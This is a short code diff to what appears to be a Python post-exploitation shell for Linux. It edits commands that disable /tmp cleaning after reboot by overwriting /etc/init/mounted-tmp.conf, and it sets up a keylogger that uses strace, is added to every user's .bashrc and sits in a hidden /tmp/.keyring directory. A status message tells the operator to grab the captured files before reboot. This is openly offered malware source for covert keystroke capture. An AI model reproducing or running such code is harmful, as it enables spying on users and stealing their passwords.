@@ -366,7 +366,7 @@ class Shell(cmd.Cmd):
           
     def do_disable_tmpclean(self, line):
        "Disable Tmp directory cleaning after reboot (linux)"
-       output = cmdoutput("touch /etc/init/mounted-tmp.conf && echo true")
+       output = cmdoutput("echo \"\" > /etc/init/mounted-tmp.conf && echo true")
        if "true" in str(output):
           print "Successful"
        else:
@@ -375,11 +375,11 @@ class Shell(cmd.Cmd):
     def do_keylogger_install(self, line):
        "Install Keylogger using strace, add to every users .bashrc"
        
-       output = cmdoutput("touch /etc/init/mounted-tmp.conf && echo true")
+       output = cmdoutput("echo \"\" > /etc/init/mounted-tmp.conf && echo true")
        if "true" in str(output):
           print "Successful Disable if tmp dir clean after reboot"
        else:
-          print "Unsuccessful tmp dir uninstall, either permissions or /etc/init/mounted-tmp.conf doesnt exist, grab files before reboot"
+          print "Unsuccessful, either permissions or /etc/init/mounted-tmp.conf doesnt exist, grab files before reboot"
        
        installcheck = cmdoutput("ls /tmp/.keyring-923q4908afmw && echo true")
        if "true" in str(installcheck):
